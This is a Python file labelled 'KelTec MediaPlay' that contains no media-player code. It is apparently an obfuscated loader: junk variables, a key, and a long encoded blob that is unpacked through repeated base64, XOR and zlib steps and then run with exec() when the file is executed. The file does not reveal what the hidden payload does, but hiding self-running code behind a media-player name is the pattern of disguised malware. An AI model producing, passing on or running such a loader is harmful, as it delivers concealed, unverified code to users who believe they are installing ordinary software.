# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 852051 ^ 450183
_lx1_1 = len("fa8014")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-825865)
_lx3_3 = 894301 * 0
_lx4_4 = 272989 ^ 311845
_K = '5b1aee28d1ffc4bdc83f6cd28d38e3cf8cb9fbbea9ea3c88a2ca87669ce01cdc'
_M = 'zlwzBaaTT94duZuVfO9NmDPKu8KXpWA2rQgFqgBCXzfCW3YBoZsB1hDpmcUuvUHMY8qwl8X1amH4DVKtVRFbOJQKJgLxzFaHE7mU'
_D = 'OkaYhHMUgo8gmzyuR4X7pdybwzMybrdcK73vxOQeDofFAxPNLWoKu5HCvcuwJabho519FePd0kh+FTQhBKE2kQ4StAgCOMCNrwh3NZf94mritgaH4etBPDg+2xVrGsMb5WFswRFtRUAFuatg+yZxlyzSXqQ/EBUrBU5uYcR2Ok1eYlq51lnEyl7jbdvhukpW0NqxXsOpyy2rJwVohd2e95qi6QMTmSohzrGDVMRH9zRcGwjAovDKWFo8iWGhd/ptRD69yiAtIWBqtOqvi9CeuvmQyawKQRM+MPIKfgs31fPCR10ZFoMSJ5d4Lc4buHXPRJWDNI+OiRjDDX/qDKtfpb+sbF0tOgDTlH2cLPCicaFqyshKxSbzrhrE3oDNz1xeT/G5vgWA14pDxEpfCMZyKFea4uZ8MMFTGNdrny5U9RuZkEv9GwTcReaQj8/+k6imPQeaRn2rv6R4zA0i9JphKyjAVfKFHAzzfGbtacSB1J5eJuGeA0U7nv4fOZs5YZCSKhtqghHsKduOgGt8J/qYERJNJn0hQkDQBQ/AMEu7XQazzLYigXJ+kKbjY9cPbQHV398Wb7Ju9kHFqxfRYW/8jbUvq768/UGt2UsFV+eo0ILql0213u8Vz2nOvOnx6cF4gsYyYDVrPugMaECNs04G4f2bRcqoKILEyM//E5D3XyvpA2UHfb/rgEzjmk+BMKooPzGwZf4Be9uEhjPnSnuDrnCtd4Ou1SzcLeTOaGMYeKLlGOdr/iP5bks/H8r6ACe0PBC/rlC8/AoXfzdJFZAqUkV0HqUhFH9SZXsyWi8wtck+5+qv4/MiPnv9+mEA7FW2UiOTsezPWFZrBryKZvd5ErwjtlW/mGxNFCPJeL9Hx0WBqsILHfM78785jGKxgH7fZQadV79OkInO36D8zjXMjaA5/skoGUTux13CMUXuy1Cmi3IXng4uTvNZlx1ErOYZK+02RcyrJrjmdcoRVxP+894kzLRPcI87rBKZVfbDEi72a+2WTV/4OLAbgmyWZI619drxwgrJ/odVEWr0mRae2J9rsm9ZwsjMPnvnZZ0TZtxSy3PPgPTMlH2nd5svcv2l+PlWWPVpUCmTKiFg1W7PIOF3HjC6WMpP0h9XQGWaJVn0bSEcQMyoeuuq4Y/V/9a1XVCeA8xtZSv1HV1EvZHv3MNtZtjKfVAKJe/UBsXlKjhTv2u4QSmPcEJ3/RV2R9pKuvaNjUOxtXbq7Cg/n5OGN2/nY5KsTV55B4bX/fTSbH3V4epkHPHVMozK83gluAOkuR6wSPm3QE6Zss4Jf/z1Ow9P8gt8UzrT/LvMHb+yl1Uq7NOZRO1W+3giMi4kGZu8RWhGYJIFfJN94wMp2Jb3ZWGIiQomqe18uHXxYMXUBPKI8bfmsB6pqwHSnO944diMApYRc2enXYnuptEESeFN55EJe/c5IaAxWj06B9NCYVfP//RRFI0ZjHyOLP1LdDdQta03ZTQ2ziFxs46PlzLMrhBgELqZXBdf2p9w6zBvxfftN77XjdopfLoPOUveNdHuU6tbzdIPhw6PCW/O4H2hHZq+UFTyWRysXOXl8ENMaZ/wWZ7eI8LLOCVV'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()